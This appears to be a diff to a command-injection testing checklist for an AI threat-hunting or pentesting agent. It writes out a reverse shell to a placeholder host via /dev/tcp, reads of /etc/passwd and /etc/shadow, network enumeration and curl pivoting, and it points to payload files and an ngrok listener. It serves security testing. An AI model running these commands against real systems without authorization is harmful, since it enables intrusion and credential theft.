@@ -65,7 +65,8 @@ origin: AI Threat Hunting
 ### 6. Exploitation
 
 - [ ] Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files
-- [ ] Establish reverse shell: `; bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`
+- [ ] Establish reverse shell (MANUAL listener required — see `references/offensive-tactics/shell-handling.md`):
+      `; bash -i >& /dev/tcp/LISTENER_HOST/LISTENER_PORT 0>&1`
 - [ ] Enumerate internal network: `; ifconfig`, `; cat /etc/hosts`
 - [ ] Pivot: `; curl http://internal-service/`
 
@@ -85,3 +86,9 @@ origin: AI Threat Hunting
 - Filter/WAF bypass technique required
 - Severity: Critical (RCE achieved) or High (blind confirmed)
 - Remediation: use allowlists, parameterized APIs, avoid shell calls
+
+## Extended Resources
+
+- `agent/references/payloads/command-injection-payloads.md` — blind detection, filter bypass, Linux/Windows, argument injection
+- `agent/references/vuln-checklists/A05-injection.md` — OWASP Top 10:2025 injection checklist
+- `agent/references/offensive-tactics/shell-handling.md` — pwncat-vl listener setup, tmux sessions, ngrok exposure (required when exploitation reaches RCE)
